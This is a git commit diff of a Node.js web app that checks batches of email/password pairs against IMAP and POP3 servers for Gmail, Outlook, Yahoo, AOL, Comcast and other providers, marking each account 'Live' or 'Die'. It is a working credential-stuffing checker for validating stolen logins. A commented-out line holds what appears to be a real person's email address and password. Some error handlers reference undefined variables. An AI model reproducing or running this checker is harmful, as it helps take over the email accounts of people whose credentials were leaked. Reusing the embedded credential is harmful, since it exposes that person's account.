a91f0c81aab52a8c0ba268734e421ea8133a8b68
Đặng Hải Long <longdhit@mac24hs-MacBook-Pro.local>
2018-03-07 00:49:42 +0700

    init commit

--- index.js
+++ index.js
@@ -1,102 +1,122 @@
-const imaps = require('imap-simple');
 const express = require('express');
 const bodyParser = require('body-parser')
 const app = express();
 const port = process.env.PORT||80
+const server = require("http").Server(app);
 app.use(bodyParser.urlencoded({ extended: false }))
-app.use(express.static('./dist'));
 app.set('view engine', 'ejs');
 app.set('views', './views');
 app.use(express.static('./public'));
-
-var server = require("http").Server(app);
-var io = require("socket.io")(server);
-server.listen(port);
-
-io.on("connection", function(socket){
-  socket.on("Client-send-data",function(data){
-    let list = data.split(/(?:\r\n|\r|\n)/g);
-    list.forEach(e => {
-        split = e.split("|");
-        var u = split[0];
-        var p = split[1];
-        checkemail(u,p).then(result =>{
-            socket.emit("Serven-send-data",result)
-        }).catch(error=>{
-            socket.emit("Serven-send-data",{stt:0,ret:"Not support|"+u+"|"+p})
-        })
-        
-    });
-  });
-
-});
-
-
+//server.listen(port);
 app.get("/", function(req, res){
-  res.render("index");
+    res.render("index");
 });
-
-
-app.get('*', function(req, res) {
-    res.send('Hello, World!');
-  });
-var mail_config = [
-    {domain:"hotmail.com",host:"imap-mail.outlook.com",port:993,tls:true},
-    {domain:"msn.com",host:"imap-mail.outlook.com",port:993,tls:true},
-    {domain:"live.com",host:"imap-mail.outlook.com",port:993,tls:true},
-    {domain:"outlook.com",host:"imap-mail.outlook.com",port:993,tls:true},
-    {domain:"gmail.com",host:"imap.gmail.com",port:993,tls:true},
-    {domain:"att.net",host:"imap.mail.yahoo.com",port:993,tls:true},
-    {domain:"yahoo.com",host:"imap.mail.yahoo.com",port:993,tls:true},
-    {domain:"kc.rr.com",host:"mail.twc.com",port:993,tls:true},
-    {domain:"adelphia.net",host:"mail.twc.com",port:993,tls:true},
-    {domain:"wanadoo.fr",host:"imap.orange.fr",port:993,tls:true},
-    {domain:"cox.net",host:"imap.cox.net",port:993,tls:true},
-    {domain:"charter.net",host:"mobile.charter.net",port:993,tls:true},
-    {domain:"sbcglobal.net",host:"imap.mail.yahoo.com",port:993,tls:true},
-    {domain:"aol.com",host:"imap.aol.com",port:993,tls:true},
-    {domain:"mail.com",host:"imap.mail.com",port:993,tls:true},
-    {domain:"email.com",host:"imap.mail.com",port:993,tls:true},
-    {domain:"optonline.net",host:"mail.optonline.net",port:993,tls:true},
-    {domain:"bigpond.com",host:"imap.telstra.com",port:993,tls:true},
-    {domain:"telstra.com",host:"imap.telstra.com",port:993,tls:true},
-    {domain:"q.com",host:"mail.q.com",port:993,tls:true},
-    //{domain:"netscape.com",host:"imap.aol.com",port:993,tls:true}
+app.post("/",function(req,res){
+    email = req.body.email.trim()
+    password = req.body.password.trim()
+    let r = mail_config.find(mail => mail.domain === getDomain(email));
+    if (r) {
+       if(r.method==1) check_imap(email,password,r.host,r.port).then(result => res.send(result)).catch(error => res.send({stt:-1,ret:"Error|"+err.message+"|"+email+"|"+password}))
+       else check_pop3(email,password,r.host,r.port).then(result => res.send(result)).catch(error => res.send(error))
+    }
+    else{
+        check_imap(email,password,"imap.gmail.com",993)
+        .then(result => res.send(result))
+        .catch(error => res.send({stt:-1,ret:"Error|"+err+"|"+email+"|"+password}))
+    }
+})
+const mail_config = [
+    {domain:"hotmail.com",host:"imap-mail.outlook.com",port:993,method:1},
+    {domain:"msn.com",host:"imap-mail.outlook.com",port:993,method:1},
+    {domain:"live.com",host:"imap-mail.outlook.com",port:993,method:1},
+    {domain:"outlook.com",host:"imap-mail.outlook.com",port:993,method:1},
+    {domain:"gmail.com",host:"imap.gmail.com",port:993,method:1},
+    {domain:"att.net",host:"imap.mail.yahoo.com",port:993,method:1},
+    {domain:"yahoo.com",host:"imap.mail.yahoo.com",port:993,method:1},
+    {domain:"rr.com",host:"mail.twc.com",port:993,method:1},
+    {domain:"adelphia.net",host:"mail.twc.com",port:993,method:1},
+    {domain:"wanadoo.fr",host:"imap.orange.fr",port:993,method:1},
+    {domain:"cox.net",host:"imap.cox.net",port:993,method:1},
+    {domain:"charter.net",host:"mobile.charter.net",port:993,method:1},
+    {domain:"sbcglobal.net",host:"imap.mail.yahoo.com",port:993,method:1},
+    {domain:"aol.com",host:"imap.aol.com",port:993,method:1},
+    {domain:"mail.com",host:"imap.mail.com",port:993,method:1},
+    {domain:"email.com",host:"imap.mail.com",port:993,method:1},
+    {domain:"optonline.net",host:"mail.optonline.net",port:993,method:1},
+    {domain:"bigpond.com",host:"imap.telstra.com",port:993,method:1},
+    {domain:"telstra.com",host:"imap.telstra.com",port:993,method:1},
+    {domain:"q.com",host:"mail.q.com",port:993,method:1},
+    {domain:"comcast.net",host:"mail.comcast.net",port:995,method:2},
 ];
-
-function checkemail(email,password) {
+function check_imap(email,password,host,port){
     return new Promise((resolve, reject) => {
-        email = email.trim()
-        password = password.trim()
-        let r = mail_config.find(mail => mail.domain === checktype(email));
+        const imaps = require('imap-simple');
         let config = {
             imap: {
                 user: email,
                 password: password,
-                host: r.host,
-                port: r.port,
-                tls: r.tls,
-                connectTimeout: 300000,
-                authTimeout: 300000
+                host: host,
+                port: port,
+                tls: true,
+                connectTimeout: 30000,
+                authTimeout: 30000
             }
         };
-        
         imaps.connect(config).then(connection => {
             resolve({stt:1,ret:"Live|"+email+"|"+password})
             connection.end()
         }).catch(error => {
             if (error.message == "Please log in via your web browser: https://support.google.com/mail/accounts/answer/78754 (Failure)") {
+                connection.end()    
                 resolve({stt:1,ret:"Live|"+email+"|"+password})
             }
             else{
+                connection.end()
                 resolve({stt:0,ret:"Die|"+email+"|"+password})
             }
         })
+    })
+}
+function check_pop3(email,password,host,port){
+    return new Promise((resolve, reject) => {
+        var POP3Client = require("poplib");
+        var client = new POP3Client(port, host, {
+                tlserrs: true,
+                ssl:true,
+                enabletls: true,
+                debug: false
+        });
+        client.on("error", function(err) {
+            if (err.errno === 111) reject({stt:-1,ret:"Error|Unable to connect to server|"+email+"|"+password});
+            else reject({stt:-1,ret:"Error|Server error occurred|"+email+"|"+password});
+            reject({stt:-1,ret:"Error|"+err+"|"+email+"|"+password});
     });
+        client.on("connect", function() {
+            client.login(email, password);
+        });
+        client.on("login", function(status, rawdata) {
+            if (status) {
+                client.quit();
+                resolve({stt:1,ret:"Live|"+email+"|"+password})
+                client.list();
+            } else {
+                client.quit();
+                resolve({stt:0,ret:"Die|"+email+"|"+password})
+            }
+        });
+    });
+}
 
-}
-function checktype(email){
+function getDomain(email){
+    let res
     let matches = email.match(/^[^@]+@([a-zA-Z0-9._-]+\.[a-zA-Z]+)$/);
-    let domain = matches[1];
-    return domain
+    if(matches){
+        if(email.match(/[a-zA-Z0-9._-]+.rr.com/)) return "rr.com"
+        else res = matches[1]
+    }
+    return res
 }
+
+// check_pop3("trench4u@comcast.net","davidson","mail.comcast.net",995).then(result=>{
+//     console.log(result)
+// })
